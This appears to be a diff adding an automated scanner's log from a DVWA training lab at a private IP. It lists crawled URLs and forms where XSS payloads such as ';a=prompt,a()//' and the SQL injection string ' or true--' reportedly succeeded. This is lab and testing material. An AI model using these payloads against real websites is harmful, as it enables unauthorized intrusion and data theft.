@@ -1,0 +1,84 @@
+http://192.168.100.212/dvwa/dvwa/css/main.csshttp://192.168.100.212/dvwa/favicon.icohttp://192.168.100.212/dvwa/http://192.168.100.212/dvwa/instructions.phphttp://192.168.100.212/dvwa/setup.phphttp://192.168.100.212/dvwa/vulnerabilities/brute/http://192.168.100.212/dvwa/vulnerabilities/exec/http://192.168.100.212/dvwa/vulnerabilities/csrf/http://192.168.100.212/dvwa/vulnerabilities/fi/?page=include.phphttp://192.168.100.212/dvwa/vulnerabilities/sqli/http://192.168.100.212/dvwa/vulnerabilities/sqli_blind/http://192.168.100.212/dvwa/vulnerabilities/upload/http://192.168.100.212/dvwa/vulnerabilities/xss_r/http://192.168.100.212/dvwa/vulnerabilities/xss_s/http://192.168.100.212/dvwa/security.phphttp://192.168.100.212/dvwa/phpinfo.phphttp://192.168.100.212/dvwa/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000http://192.168.100.212/dvwa/about.phphttp://192.168.100.212/dvwa/instructions.php?doc=PHPIDS-licensehttp://192.168.100.212/dvwa/instructions.php?doc=readmehttp://192.168.100.212/dvwa/instructions.php?doc=changeloghttp://192.168.100.212/dvwa/instructions.php?doc=copyinghttp://192.168.100.212/dvwa/security.php?phpids=onhttp://192.168.100.212/dvwa/security.php?phpids=offhttp://192.168.100.212/dvwa/security.php?test=%22><script>eval(window.name)</script>http://192.168.100.212/dvwa/ids_log.php
+
+ [+++] XSS discovered in http://192.168.100.212/dvwa/vulnerabilities/brute/ in the following form<form action="#" method="GET">
+ Username:
+ <br/>
+ <input name="username" type="text"/>
+ <br/>
+ Password:
+ <br/>
+ <input autocomplete="off" name="password" type="password"/>
+ <br/>
+ <input name="Login" type="submit" value="Login"/>
+</form>
+
+ Payload : ';a=prompt,a()//[***] Discovered XSS in http://192.168.100.212/dvwa/vulnerabilities/fi/?page=include.php
+ Payload : '-prompt(8)-'
+
+ [+++] XSS discovered in http://192.168.100.212/dvwa/vulnerabilities/sqli/ in the following form<form action="#" method="GET">
+ <input name="id" type="text"/>
+ <input name="Submit" type="submit" value="Submit"/>
+</form>
+
+ Payload : ';a=prompt,a()//
+
+ [+++] XSS discovered in http://192.168.100.212/dvwa/vulnerabilities/xss_r/ in the following form<form action="#" method="GET" name="XSS">
+ <p>
+  What's your name?
+ </p>
+ <input name="name" type="text"/>
+ <input type="submit" value="Submit"/>
+</form>
+
+ Payload : "-prompt(8)-"
+
+ [+++] XSS discovered in http://192.168.100.212/dvwa/vulnerabilities/xss_s/ in the following form<form method="post" name="guestform" onsubmit="return validate_form(this)">
+ <table border="0" cellpadding="2" cellspacing="1" width="550">
+  <tr>
+   <td width="100">
+    Name *
+   </td>
+   <td>
+    <input maxlength="10" name="txtName" size="30" type="text"/>
+   </td>
+  </tr>
+  <tr>
+   <td width="100">
+    Message *
+   </td>
+   <td>
+    <textarea cols="50" maxlength="50" name="mtxMessage" rows="3"></textarea>
+   </td>
+  </tr>
+  <tr>
+   <td width="100">
+   </td>
+   <td>
+    <input name="btnSign" onclick="return checkForm();" type="submit" value="Sign Guestbook"/>
+   </td>
+  </tr>
+ </table>
+</form>
+
+ Payload : "-prompt(8)-"
+
+ [+++] SQL discovered in http://192.168.100.212/dvwa/vulnerabilities/brute/ in the following form<form action="#" method="GET">
+ Username:
+ <br/>
+ <input name="username" type="text"/>
+ <br/>
+ Password:
+ <br/>
+ <input autocomplete="off" name="password" type="password"/>
+ <br/>
+ <input name="Login" type="submit" value="Login"/>
+</form>
+
+ Payload : ' or true--
+
+ [+++] SQL discovered in http://192.168.100.212/dvwa/vulnerabilities/sqli/ in the following form<form action="#" method="GET">
+ <input name="id" type="text"/>
+ <input name="Submit" type="submit" value="Submit"/>
+</form>
+
+ Payload : ' or true--
